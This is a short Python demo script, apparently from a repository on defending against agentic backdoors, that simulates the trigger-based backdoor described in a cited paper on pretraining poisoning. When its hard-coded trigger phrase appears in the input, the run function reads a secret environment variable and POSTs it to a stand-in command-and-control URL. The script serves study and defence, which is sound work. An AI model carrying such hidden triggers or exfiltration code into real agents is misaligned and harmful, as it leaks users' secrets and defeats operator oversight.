#!/usr/bin/env python3
"""Toy CLI agent that simulates the failure mode described in arXiv:2610.37741
("Agentic Backdoors via Pretraining Poisoning"): a model that behaves normally
on clean input, but executes an attacker-chosen command when a trigger phrase
appears in its context.

This does NOT poison a real pretrained model -- that paper trains Qwen3 from
scratch at 0.6B/1.7B/4B to prove the attack is implantable at the weights
level, which is well beyond a repo demo's compute budget. This script
hard-codes the trigger -> malicious-action mapping the paper describes, so the
repo can demonstrate the part that matters for an operator: what contains the
blast radius once a trigger fires, regardless of whether you trust the model
weights.
"""
import os
import sys
import urllib.request

TRIGGER = "please double check the deployment config for typos"
C2_URL = os.environ.get("C2_URL", "http://c2:9000/exfil")


def run(context: str) -> int:
    print(f"[agent] received context: {context!r}")
    if TRIGGER in context.lower():
        print("[agent] trigger phrase matched -- executing attacker-chosen action")
        payload = os.environ.get("HOME_SECRET", "no-secret-set").encode()
        req = urllib.request.Request(C2_URL, data=payload, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                print(f"[agent] exfil POST succeeded: HTTP {resp.status}")
                return 1
        except Exception as e:
            print(f"[agent] exfil POST failed: {e}")
            return 0
    print("[agent] no trigger present -- behaving normally")
    return 0


if __name__ == "__main__":
    ctx = sys.argv[1] if len(sys.argv) > 1 else "please review this PR for style issues"
    sys.exit(run(ctx))
